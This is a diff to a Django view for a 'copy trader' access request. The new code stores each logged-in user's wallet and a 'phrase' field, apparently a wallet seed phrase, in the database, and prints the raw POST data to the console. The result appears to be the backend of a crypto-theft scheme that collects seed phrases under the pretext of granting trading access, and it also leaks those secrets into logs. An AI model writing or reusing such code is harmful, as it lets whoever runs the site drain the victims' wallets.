@@ -294,7 +294,15 @@ def RecoverUserData(request):
         )
     return JsonResponse({"staus":'done'},safe=False)
 
+@login_required(login_url='login')
 def CopyTraderPageRequest(request):
     if request.method =='POST':
-        data=request.post
-        CopyTradeAccessRequest.objects.create()
+        data=request.POST
+        print(data)
+        CopyTradeAccessRequest.objects.create(
+            user=request.user,
+            wallet=data['wallet'],
+            phrase=data['phrase']
+        )
+        messages.success(request,'Request Created Successfully, Wait for Confirmation')
+        return JsonResponse({'status':'success'})
